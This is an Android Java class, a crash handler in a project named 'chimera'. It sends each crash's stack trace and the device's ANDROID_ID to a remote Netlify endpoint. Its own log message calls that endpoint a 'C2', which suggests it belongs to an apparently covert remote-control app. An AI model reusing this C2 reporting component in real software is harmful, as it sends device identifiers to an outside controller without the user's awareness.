package com.chimera;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.NonNull;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.PrintWriter;
import java.io.StringWriter;

public class CrashHandler implements Thread.UncaughtExceptionHandler {

    private static final String TAG = "CrashHandler";
    private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
    private final Thread.UncaughtExceptionHandler defaultUEH;
    private final Context context;

    public CrashHandler(Context context) {
        this.defaultUEH = Thread.getDefaultUncaughtExceptionHandler();
        this.context = context.getApplicationContext();
    }

    @Override
    public void uncaughtException(@NonNull Thread t, @NonNull Throwable e) {
        StringWriter sw = new StringWriter();
        e.printStackTrace(new PrintWriter(sw));
        String stackTrace = sw.toString();
        
        Log.e(TAG, "FATAL CRASH DETECTED. Reporting to C2.");
        submitDataToServer("crash_report", stackTrace);
        
        try {
            Thread.sleep(1000);
        } catch (InterruptedException interruptedException) {
            // Ignored
        }

        if (defaultUEH != null) {
            defaultUEH.uncaughtException(t, e);
        }
    }

    private void submitDataToServer(String dataType, String payload) {
        RequestQueue requestQueue = Volley.newRequestQueue(context);
        String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData, null, null);
            requestQueue.add(request);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create crash report JSON", e);
        }
    }
}
